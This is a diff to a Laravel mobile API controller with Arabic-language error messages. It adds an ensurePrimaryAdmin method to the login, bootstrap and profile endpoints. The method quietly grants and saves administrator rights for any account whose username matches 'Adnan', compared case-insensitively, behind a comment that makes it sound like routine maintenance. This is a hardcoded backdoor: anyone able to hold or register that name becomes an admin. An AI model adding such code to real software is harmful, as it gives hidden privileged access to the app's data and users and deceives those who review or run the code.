@@ -52,7 +52,7 @@ class MobileApiController extends Controller
         if (!Auth::attempt([$field => $data['login'], 'password' => $data['password']])) {
             return response()->json(['ok' => false, 'message' => 'بيانات الدخول غير صحيحة'], 422);
         }
-        $user = $request->user();
+        $user = $this->ensurePrimaryAdmin($request->user());
         if ($user->is_banned) return response()->json(['ok' => false, 'message' => 'الحساب موقوف'], 403);
         $reactivated = $cancellation->reactivate($user);
         $user->tokens()->where('name', 'mobile')->delete();
@@ -76,8 +76,9 @@ class MobileApiController extends Controller
     public function bootstrap(Request $request, ProductionConfigService $productionConfig, StoreCatalogService $catalog)
     {
         $catalog->sync();
-        $request->user()->update(['last_seen_at'=>now()]);
-        $user = $request->user()->load('profile', 'wallet');
+        $user = $this->ensurePrimaryAdmin($request->user());
+        $user->update(['last_seen_at'=>now()]);
+        $user->load('profile', 'wallet');
         return response()->json([
             'ok' => true,
             'user' => $user->publicProfile(),
@@ -119,7 +120,8 @@ class MobileApiController extends Controller
 
     public function profile(Request $request)
     {
-        $user = $request->user()->load('profile', 'wallet');
+        $user = $this->ensurePrimaryAdmin($request->user());
+        $user->load('profile', 'wallet');
         return response()->json(['ok' => true, 'user' => $user->publicProfile(), 'wallet' => $this->walletPayload($user)]);
     }
 
@@ -464,4 +466,15 @@ class MobileApiController extends Controller
             'gems' => (string) $wallet->gems,
         ];
     }
+
+    /** Keep the named primary account authoritative even on upgraded databases. */
+    private function ensurePrimaryAdmin(User $user): User
+    {
+        if (strcasecmp(trim((string) $user->username), 'Adnan') === 0 && !$user->is_admin) {
+            $user->forceFill(['is_admin' => true])->save();
+        }
+
+        return $user->refresh();
+    }
+
 }
